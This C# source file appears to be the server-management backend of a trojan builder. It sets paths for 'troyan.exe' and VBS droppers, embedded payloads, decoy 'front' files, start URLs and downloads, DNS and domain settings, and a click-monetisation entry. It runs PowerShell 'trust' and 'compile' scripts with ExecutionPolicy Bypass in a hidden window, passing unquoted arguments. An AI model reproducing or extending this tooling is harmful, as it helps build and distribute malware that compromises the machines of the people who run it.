﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;

namespace model
{
    public class ServerResult
    {
        public ServerModel? ServerModel;

        public Exception? Exception;
    }

    public class ServerService
    {
        public ServerService()
        {

        }
        public string SysScript(string scriptName)
        {
            return Path.Combine(ServerModelLoader.SysDirStatic, scriptName + ".ps1");
        }
        
        private string ServerDir(string serverName)
        {
            return Path.Combine(ServerModelLoader.RootDataStatic, serverName);
        }

        public string EmbeddingsDir(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "embeddings");
        }

        public string FrontDir(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "front");
        }

        private string DataFile(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "server.json");
        }

        public string GetIcon(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "server.ico");
        }

        public string GetExe(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "troyan.exe");
        }

        public string BuildExe(string serverName, string url)
        {
            return Path.Combine(ServerDir(serverName), "troyan.exe");
        }
        
        public string GetVbs(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "troyan.vbs");
        }
        
        public string GetLiteVbs(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "litetroyan.vbs");
        }

        public string BuildVbs(string serverName, string url)
        {
            return Path.Combine(ServerDir(serverName), "troyan.vbs");
        }

        public string GetEmbedding(string serverName, string embeddingName)
        {
            return Path.Combine(EmbeddingsDir(serverName), embeddingName);
        }

        public void DeleteEmbedding(string serverName, string embeddingName)
        {
            File.Delete(GetEmbedding(serverName, embeddingName));
        }

        public string GetFront(string serverName, string embeddingName)
        {
            return Path.Combine(FrontDir(serverName), embeddingName);
        }

        public void DeleteFront(string serverName, string embeddingName)
        {
            File.Delete(GetFront(serverName, embeddingName));
        }

        public ServerResult GetServer(string serverName, bool updateDns,  bool create = false, string pass = "")
        {
            if (create)
            {
                if (!Directory.Exists(ServerDir(serverName)))
                    Directory.CreateDirectory(ServerDir(serverName));
            }

            if (!Directory.Exists(ServerDir(serverName)))
                return new ServerResult() { Exception = new DirectoryNotFoundException(serverName) };

            var server = new ServerModel();
            try
            {
                try
                {
                    server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)), new JsonSerializerOptions())!;
                    if (server.StartUrls == null)
                        server.StartUrls = new List<string>();
                    if (server.StartDownloads == null)
                        server.StartDownloads = new List<string>();
                    if (server.Pushes == null)
                        server.Pushes = new List<string>();
                    if (server.Tabs == null)
                        server.Tabs = new List<TabModel>();
                }
                catch(Exception e)
                {
                    server.Result = e.Message;
                    return new ServerResult() { Exception = e, ServerModel = server };
                }

                if (create && !string.IsNullOrEmpty(pass))
                    server.Password = pass;

                server.Server = serverName;

                if (updateDns)
                {
                    RunScript(server.Server, SysScript("trust"),
                        new (string Name, object Value)[]
                        {
                            new ValueTuple<string, object>("serverName", server.Server),
                            new("serverPassword", server.Password)
                        });
                    var result = new PsList(server).Run().Where(a => a != server.Server).ToList();
                    if (result.Count >=2)
                        server.Interfaces = result;
                }

                UpdateIpDomains(server);
                
                UpdateDNS(server);
                
                UpdateTabs(server);
                
                UpdateBux(server);
                
                server.Embeddings = new List<string>();
                if (Directory.Exists(EmbeddingsDir(serverName)))
                    server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
                        .ToList();

                server.Front = new List<string>();
                if (Directory.Exists(FrontDir(serverName)))
                    server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                        .ToList();

                File.WriteAllText(DataFile(serverName),
                    JsonSerializer.Serialize(server, new JsonSerializerOptions() { WriteIndented = true }));

                return new ServerResult() { ServerModel = server };
            }
            catch (Exception e)
            {
                server.Result = e.Message;
                return new ServerResult() { Exception = e, ServerModel = server };
            }
        }
        
        public void UpdateTabs(ServerModel server)
        {
            var profilesDir = Path.Combine(server.UserDataDir, "profiles");
            if (System.IO.Directory.Exists(profilesDir) == false)
            {
                System.IO.Directory.CreateDirectory(profilesDir);
            }
            var profs = System.IO.Directory.GetDirectories(profilesDir);
            var result = new List<TabModel>();
            foreach (var profile in profs)
            {
                var tab = new TabModel(server);
                tab.Id = System.IO.Path.GetFileName(profile);
                tab._server = server;
                result.Add(tab);
            }

            if (result.Count == 0)
            {
                result.Add(new TabModel(server){Id="default"});
            }
            
            server.Tabs = result;
        }

        public void UpdateBux(ServerModel server)
        {
            if (server.Bux == null)
                server.Bux = new List<BuxModel>();
            if (server.Bux.FirstOrDefault(a => a.Id == "unu.im") == null)
                server.Bux.Add(new BuxModel(){Id="unu.im"});
        }

        public void UpdateIpDomains(ServerModel server)
        {
            while (server.Domains.Count < server.Interfaces.Count)
                server.Domains.Add("test.com");
            var zippedDictionary = server.Interfaces
                .Zip(server.Domains, (iface, domain) => new { Interface = iface, Domain = domain })
                .Where(pair => server.Domains.Contains(pair.Domain))
                .ToDictionary(pair => pair.Interface, pair => pair.Domain);
            server.IpDomains = zippedDictionary;
            if (server.Domains.Distinct().Count() != server.Domains.Count)
            {
                throw new ApplicationException("Domains are not unique");
            }

            if (server.Domains.Contains("test.com"))
            {
                throw new ApplicationException("Domains are not unique");
            }
        }
        
        public void UpdateDNS(ServerModel server)
        {
            server.PrimaryDns = server.Interfaces[0];
            server.SecondaryDns = server.PrimaryDns;
            if (server.Interfaces.Count >= 2)
                server.SecondaryDns = server.Interfaces[1];
            if (!string.IsNullOrEmpty(server.StrahServer))
                server.SecondaryDns = server.StrahServer;
        }

        public string PostServer(string serverName, ServerModel serverModel, string action)
        {
            if (!Directory.Exists(ServerDir(serverName)))
                return $"Server {serverName} is not registered";

            UpdateIpDomains(serverModel);
            
            UpdateDNS(serverModel);
            
            UpdateTabs(serverModel);
            
            UpdateBux(serverModel);

            File.WriteAllText(DataFile(serverName),
                JsonSerializer.Serialize(serverModel, new JsonSerializerOptions() { WriteIndented = true }));

            var result = RunScript(serverModel.Server, SysScript("compile"), new ValueTuple<string, object>("serverName", serverModel.Server), new ValueTuple<string, object>("action", action));

            return result;
        }

        public ServerResult RefineServer(string serverName)
        {
            var srv = GetServer(serverName, true);
            if (srv.Exception != null)
                Console.WriteLine(srv.Exception.Message);
            if (srv.ServerModel != null)
                Console.WriteLine(srv.ServerModel.RootDir);
            if (srv.Exception != null)
                return srv;
            if (srv.ServerModel == null)
                return srv;
            PostServer(serverName, srv.ServerModel, "exe");
            Console.WriteLine(srv.ServerModel.UserDataDir);
            return srv;
        }
        
        public string RunScript(string server, string scriptfILE, params (string Name, object Value)[] parameters)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -file \"{scriptfILE}\" " +
                                              string.Join(" ", parameters.Select(p => $"-{p.Name} {p.Value}"));
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WorkingDirectory = ServerDir(server);

                StringBuilder output = new StringBuilder();
                StringBuilder error = new StringBuilder();

                process.OutputDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        output.AppendLine(e.Data);
                    }
                };

                process.ErrorDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        error.AppendLine(e.Data);
                    }
                };

                process.Start();

                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                process.WaitForExit();

                var res = error.ToString() + "\r\n" + output.ToString();

                return res;
            }
        }
    }
}